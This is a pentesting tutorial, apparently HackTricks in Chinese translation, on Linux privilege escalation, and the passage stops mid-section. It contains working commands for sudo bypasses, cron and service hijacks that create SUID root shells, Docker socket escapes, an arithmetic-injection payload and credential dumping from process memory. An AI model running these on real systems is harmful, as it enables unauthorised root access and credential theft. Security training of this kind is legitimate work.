# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### 操作系统信息

让我们开始获取有关正在运行的操作系统的信息。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

如果你 **对 `PATH` 变量中任何文件夹拥有写权限**，你可能能够劫持某些库或二进制文件:
```bash
echo $PATH
```
### 环境信息

环境变量中是否包含有趣的信息、密码或 API keys？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，查看是否存在可用于 escalate privileges 的 exploit。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一份很好的已知漏洞内核列表以及一些已经 **compiled exploits**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) 和 [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的网站： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有受影响的内核版本，你可以执行：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可帮助查找 kernel exploits 的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (在受害主机上执行，仅检查针对 kernel 2.x 的 exploits)

始终 **在 Google 上搜索内核版本**，可能你的内核版本出现在某个 kernel exploit 中，这样你就能确定该 exploit 是否有效。

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

基于出现在以下位置的有漏洞的 sudo 版本：
```bash
searchsploit sudo
```
你可以使用此 grep 检查 sudo 版本是否存在漏洞。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo 版本在 1.9.17p1 之前（**1.9.14 - 1.9.17 < 1.9.17p1**）允许非特权本地用户在从用户控制的目录使用 `/etc/nsswitch.conf` 文件时，通过 sudo `--chroot` 选项将权限提升为 root。

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [漏洞](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [漏洞公告](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

查看 **smasher2 box of HTB**，了解如何利用此 vuln 的 **示例**
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 列举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在 docker 容器内，可以尝试从中逃逸：

{{#ref}}
docker-security/
{{#endref}}

## 驱动器

检查 **哪些已挂载以及哪些未挂载**、它们在哪里以及为什么。如果有任何未挂载的内容，可以尝试将其挂载并检查是否包含私密信息
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

列举有用的 binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否安装了 **任何编译器**。这在你需要使用某些 kernel exploit 时很有用，因为建议在将要使用它的机器（或相似的机器）上对其进行编译。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 已安装的易受攻击软件

检查**已安装软件包和服务的版本**。可能存在某些旧的 Nagios 版本（例如），可被利用进行提权…\
建议手动检查那些更可疑的已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有 SSH 访问权限，你也可以使用 **openVAS** 来检查机器上安装的过期和易受攻击的软件。

> [!NOTE] > _请注意，这些命令会显示大量大多无用的信息，因此建议使用诸如 OpenVAS 之类的应用来检查已安装的软件版本是否易受已知 exploits 的影响_

## Processes

查看正在执行的 **进程**，并检查是否有任何进程拥有 **超过应有的权限**（例如由 root 执行的 tomcat？）
```bash
ps aux
ps -ef
top -n 1
```
始终检查是否有可能的 [**electron/cef/chromium debuggers** 运行，你可以滥用它来提升权限](electron-cef-chromium-debugger-abuse.md)。**Linpeas** 通过检查进程命令行中的 `--inspect` 参数来检测这些情况。\
同时 **检查你对进程二进制文件的权限**，也许你可以覆盖某个文件。

### 进程监控

你可以使用像 [**pspy**](https://github.com/DominicBreuker/pspy) 这样的工具来监控进程。这在识别频繁执行或在满足某些条件时运行的易受攻击进程时非常有用。

### 进程内存

服务器上的某些服务会将 **credentials 以明文存储在内存中**。\
通常你将需要 **root privileges** 来读取属于其他用户的进程的内存，因此这通常在你已经是 root 并想发现更多 credentials 时更有用。\
但是，记住 **作为普通用户你可以读取你拥有的进程的内存**。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

如果你能访问 FTP 服务（例如）的内存，你可以获取 Heap 并在其中搜索其 credentials。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示内存如何在该进程的** 虚拟地址空间中被映射；它还显示**每个映射区域的权限**。

伪文件 **mem** **暴露了该进程的内存本身**。

从 **maps** 文件我们可以知道哪些**内存区域是可读的**及其偏移。我们使用这些信息来**seek 到 mem 文件中并将所有可读区域转储到一个文件**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的 **物理** 内存的访问，而不是虚拟内存。  
内核的虚拟地址空间可以通过 /dev/kmem 访问.\  
通常，`/dev/mem` 只有 **root** 和 kmem 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump 适用于 linux

ProcDump 是对 Sysinternals 工具套件中经典 Windows 上的 ProcDump 工具的 Linux 重新实现。  
在此获取： [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_您可以手动移除 root 要求并转储您拥有的进程
- Script A.5 来自 [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (需要 root)

### 来自进程内存的凭据

#### 手动示例

如果你发现 authenticator 进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump 该进程（参见前面的章节以了解转储进程内存的不同方法）并在内存中搜索凭证：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 将**从内存窃取明文凭证**并从一些**常见文件**中获取凭证。它需要 root 权限才能正常工作。

| 功能                                             | 进程名               |
| ------------------------------------------------- | -------------------- |
| GDM 密码 (Kali Desktop, Debian Desktop)           | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 搜索正则/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

如果 web “Crontab UI” 面板 (alseambusher/crontab-ui) 以 root 身份运行且只绑定到 loopback，你仍然可以通过 SSH local port-forwarding 访问它并创建一个有特权的任务以提升权限。

Typical chain
- Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Find credentials in operational artifacts:
- Backups/scripts with `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- 创建一个高权限 job 并立即运行（会放置一个 SUID shell）：
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- 使用它:
```bash
/tmp/rootshell -p   # root shell
```
加固
- 不要以 root 身份运行 Crontab UI；使用专用用户并授予最小权限
- 绑定到 localhost，并通过 firewall/VPN 进一步限制访问；不要重复使用密码
- 避免在 unit files 中嵌入 secrets；使用 secret stores 或仅 root 可访问的 EnvironmentFile
- 为按需作业执行启用审计/日志记录



检查是否有任何计划任务存在漏洞。也许你可以利用由 root 执行的脚本（wildcard vuln? 能否修改 root 使用的文件? 使用 symlinks? 在 root 使用的目录中创建特定文件?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 路径

例如，在 _/etc/crontab_ 中你可以找到 PATH： _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意 user 对 /home/user 有写权限_)

如果在这个 crontab 中 root 用户尝试在未设置 PATH 的情况下执行某个命令或脚本。例如： _\* \* \* \* root overwrite.sh_\\
然后，你可以使用以下方法获得 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用包含通配符的脚本 (Wildcard Injection)

如果一个由 root 执行的脚本在命令中包含 “**\***”，你可以利用它触发意外行为（例如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果 wildcard 前面有像** _**/some/path/\***_ **这样的路径，就不易受影响（即使** _**./\***_ **也不受影响）。**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash 算术扩展注入（在 cron 日志解析器中）

Bash 在 ((...))、$((...)) 和 let 中进行算术求值之前，会先进行参数扩展和命令替换。如果一个由 root 运行的 cron/parser 读取不受信任的日志字段并将其送入算术上下文，攻击者可以注入一个命令替换 $(...)，当 cron 运行时该命令会以 root 身份执行。

- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

如果你 **可以修改由 root 执行的 cron 脚本**，你可以很容易地获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的 script 使用了一个你拥有完全访问权限的 **directory where you have full access**，那么删除该 folder 并 **create a symlink folder to another one** 指向由你控制并提供 script 的位置，可能会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 自定义签名的 cron 二进制文件（含可写负载）
蓝队有时会通过导出自定义 ELF 节并用 grep 检查厂商字符串，在以 root 身份执行前对 cron 驱动的二进制文件进行“签名”。如果该二进制文件是组可写（例如 `/opt/AV/periodic-checks/monitor` 所有者为 `root:devs 770`）并且你可以 leak 签名材料，你就可以伪造该节并劫持 cron 任务：

1. 使用 `pspy` 捕获验证流程。在 Era，root 运行了 `objcopy --dump-section .text_sig=text_sig_section.bin monitor`，随后运行 `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`，然后执行该文件。
2. 使用来自 `signing.zip` 的 leaked key/config 重新生成预期的证书：
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. 构建一个恶意的替换（例如，drop a SUID bash、add your SSH key），并将证书嵌入 `.text_sig`，以使 grep 通过：
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. 在保留执行位的同时覆盖计划的二进制文件：
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. 等待下一次 cron 运行；一旦该简单的签名检查通过，你的 payload 就会以 root 身份运行。

### 频繁的 cron 作业

你可以监控进程，查找每隔 1、2 或 5 分钟执行的进程。也许你可以利用它来升级权限。

例如，要 **以 0.1 秒间隔监控 1 分钟**、**按执行次数最少排序** 并删除那些执行次数最多的命令，你可以这样做：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (它会监视并列出每个启动的进程)。

### 不可见的 cron jobs

可以通过**在注释后放置回车符**（没有换行字符）来创建一个 cronjob，该 cronjob 将会生效。示例（注意回车字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否能够写入任何 `.service` 文件，如果可以，你**可以修改它**，使其在服务被**启动**、**重启**或**停止**时**执行**你的**backdoor**（可能需要等到机器重启）。\
例如，在 .service 文件中创建你的 backdoor，使用 **`ExecStart=/tmp/script.sh`**

### 可写的 service 二进制文件

请记住，如果你对被 services 执行的二进制文件拥有**写权限**，你可以将它们替换为 backdoors，这样当 services 被重新执行时，backdoors 就会被执行。

### systemd PATH - 相对路径

你可以查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现你可以在该路径的任意文件夹中**write**，你可能能够**escalate privileges**。你需要搜索**relative paths being used on service configurations**文件，例如：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，创建一个 **可执行文件**，其名称与 **相对路径二进制文件** 相同，放在你可以写入的 systemd PATH 文件夹内，当服务被要求执行易受攻击的操作（**Start**, **Stop**, **Reload**）时，你的 **backdoor 将被执行**（非特权用户通常无法启动/停止服务，但检查你是否可以使用 `sudo -l`）。

**使用 `man systemd.service` 学习有关服务的更多信息。**

## **计时器**

**计时器** 是以 `**.timer**` 结尾的 systemd 单元文件，用于控制 `**.service**` 文件或事件。**计时器** 可作为 cron 的替代，因为它们内置对日历时间事件和单调时间事件的支持，并且可以异步运行。

你可以使用以下命令枚举所有计时器：
```bash
systemctl list-timers --all
```
### 可写的 timers

如果你能修改一个 timer，你就可以让它执行一些现有的 systemd.unit（比如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中你可以读到 Unit 是什么：

> 在此计时器到期时要激活的单元。参数是一个单元名，其后缀不是 ".timer"。如果未指定，此值默认为与计时器单元同名但后缀不同的 service。（见上文。）建议被激活的单元名和计时器单元的单元名除后缀外应当相同。

因此，要滥用此权限你需要：

- 找到某个 systemd 单元（例如 `.service`）正在执行一个可写的二进制文件
- 找到某个 systemd 单元正在执行一个相对路径，并且你对 systemd PATH 拥有可写权限（以冒充该可执行文件）

**了解有关定时器的更多信息，请参阅 `man systemd.timer`.**

### **启用定时器**

要启用定时器，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## 套接字 (Sockets)

Unix Domain Sockets (UDS) 允许在客户端-服务器模型中在同一台或不同机器上进行 **进程间通信**。它们使用标准的 Unix 描述符文件来实现进程间通信，并通过 `.socket` 文件进行配置。

Sockets 可以使用 `.socket` 文件进行配置。

**了解更多关于 sockets 的信息请参见 `man systemd.socket`.** 在该文件中，可以配置多个有趣的参数：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: 这些选项各不相同，但总体上用于 **指明将在哪监听** 套接字（AF_UNIX 套接字文件的路径、要监听的 IPv4/6 和/或端口号等）。
- `Accept`: 接受一个布尔参数。如果为 **true**，则 **为每个传入连接生成一个 service 实例**，并且只将连接套接字传递给该实例。如果为 **false**，所有监听套接字本身将 **传递给启动的 service 单元**，并且只为所有连接生成一个 service 单元。对于 datagram sockets 和 FIFO，此值被忽略，在这些情况下单个 service 单元无条件处理所有传入流量。**Defaults to false**。出于性能原因，建议新守护进程以适用于 `Accept=no` 的方式编写。
- `ExecStartPre`, `ExecStartPost`: 接受一个或多个命令行，这些命令在监听 **sockets**/FIFOs 被 **创建** 并绑定之前或之后分别 **执行**。命令行的第一个标记必须是一个绝对文件名，后面跟随该进程的参数。
- `ExecStopPre`, `ExecStopPost`: 在监听 **sockets**/FIFOs 被 **关闭** 并移除之前或之后执行的额外 **命令**。
- `Service`: 指定在 **传入流量** 时要 **激活** 的 **service** 单元名称。此设置仅允许用于 Accept=no 的 sockets。默认指向与 socket 同名的 service（后缀替换）。在大多数情况下，不应该有必要使用此选项。

### 可写的 .socket 文件

如果你发现一个 **可写的** `.socket` 文件，你可以在 `[Socket]` 部分的开头添加类似 `ExecStartPre=/home/kali/sys/backdoor` 之类的内容（保留该命令为代码形式），backdoor 将在 socket 创建之前被执行。因此，你 **可能需要等到机器重启后**。\  
_注意：系统必须正在使用该 socket 文件的配置，否则 backdoor 不会被执行。_

### 可写的 sockets

如果你 **识别出任何可写的 socket**（_此处我们说的是 Unix Sockets，而不是配置文件 `.socket`_），那么 **你可以与该 socket 进行通信**，并可能利用某个漏洞。

### 枚举 Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP 套接字

请注意，可能存在一些**sockets 用于监听 HTTP 请求**（_我不是指 .socket 文件，而是作为 unix sockets 的那些文件_）。你可以用以下命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果该 socket **responds with an HTTP** request，那么你可以与它 **communicate** 并可能 **exploit some vulnerability**。

### 可写 Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

如果你对 Docker socket 有写权限，可以使用以下命令来 escalate privileges：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个 container，从而以 root 级别访问主机的文件系统。

#### **直接使用 Docker API**

在没有 Docker CLI 的情况下，仍然可以使用 Docker API 和 `curl` 命令来操作 Docker socket。

1.  **List Docker Images:** 获取可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 发送请求创建一个挂载主机根目录的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** 使用 `socat` 建立与容器的连接，从而在容器内执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

在建立 `socat` 连接后，你可以直接在容器中执行命令，并以 root 级别访问主机的文件系统。

### 其他

请注意，如果你对 docker socket 拥有写权限（因为你属于组 **`docker`**），你会有[**更多权限提升的方法**](interesting-groups-linux-pe/index.html#docker-group)。如果[**docker API 在某个端口监听**，你也可能能够攻破它](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下位置查看**更多从 docker 逃逸或滥用它以提升权限的方法**：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 权限提升

如果你发现可以使用 **`ctr`** 命令，请阅读下面的页面，因为**你可能能够滥用它来提升权限**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 权限提升

如果你发现可以使用 **`runc`** 命令，请阅读下面的页面，因为**你可能能够滥用它来提升权限**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的进程间通信 (IPC) 系统，允许应用程序高效地交互和共享数据。它面向现代 Linux 系统设计，为不同形式的应用通信提供了稳健的框架。

该系统功能多样，支持增强的进程间通信，改善进程之间的数据交换，有点类似于增强的 UNIX domain sockets。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自蓝牙守护进程的来电信号可以促使音乐播放器静音，从而提升用户体验。D-Bus 还支持远程对象系统，简化服务请求和方法调用，使传统上复杂的流程变得更简单。

D-Bus 基于一个允许/拒绝模型运行，根据匹配策略规则的累积效果管理消息权限（方法调用、信号发送等）。这些策略指定了与 bus 的交互方式，可能通过利用这些权限导致权限提升。

在 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中提供了这样一个策略示例，列出了 root 用户对 `fi.w1.wpa_supplicant1` 的拥有、发送和接收消息的权限。

没有指定用户或组的策略适用于所有用户，而 "default" 上下文的策略则适用于未被其他特定策略覆盖的所有情况。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在此了解如何枚举并利用 D-Bus 通信：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

枚举网络并弄清该机器的位置总是很有意思。

### 通用枚举
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### 开放端口

始终检查在你访问该机器之前无法与之交互的网络服务是否在运行：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查是否可以 sniff traffic。如果可以，你可能能够获取一些凭证。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查 **你是谁**、你拥有什么 **权限**、系统中有哪些 **用户**、哪些可以 **登录**，以及哪些具有 **root 权限**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
